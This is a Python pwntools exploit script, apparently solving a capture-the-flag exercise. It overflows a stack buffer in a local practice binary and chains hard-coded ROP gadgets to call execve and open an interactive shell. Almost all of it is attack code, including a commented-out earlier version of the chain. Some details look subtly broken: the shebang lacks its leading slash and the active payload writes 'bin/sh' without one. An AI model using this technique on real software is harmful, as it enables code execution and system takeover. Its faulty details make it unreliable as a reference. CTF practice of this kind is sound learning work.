#!usr/bin/python3
from pwn import *

#meet the problem : __stack_chk_fail_local....(trace by gdb)

context.arch = 'amd64'

y = process('/home/cuteleo/workspace/pwn/ntu_ctf_demo/basic/rop/rop')
pause()

pop_rdi = 0x0000000000400696
pop_rsi = 0x0000000000410133
pop_rdx = 0x0000000000449975
mov_q_rdi_rsi = 0x00000000004470db
pop_rax = 0x0000000000415754
syscall = 0x000000000040128c

pop_rdx_rsi = 0x000000000044bf09

bss = 0x6b6030
"""
p = 'a' * (0x30 + 8 )

p += p64( pop_rdi ).decode('latin-1')

p += p64( bss ).decode('latin-1') #any read region

p += p64( pop_rsi ).decode('latin-1')
p += /bin/sh\0

p += p64( mov_q_rdi_rsi ).decode('latin-1')

p += p64( pop_rdx_rsi ).decode('latin-1')
p += p64( 0 ).decode('latin-1')
p += p64( 0 ).decode('latin-1')

p += p64( pop_rax ).decode('latin-1')
p += p64( 0x3b ).decode('latin-1')

p += p64( syscall ).decode('latin-1')
"""

p = flat(
    'a' * 0x38,
    pop_rdi,
    bss,
    pop_rsi,
    'bin/sh\0',
    mov_q_rdi_rsi,
    pop_rsi,
    0,
    pop_rdx,
    0,
    pop_rax,
    0x3b,
    syscall
)

y.sendlineafter( ":D", p )

y.interactive()
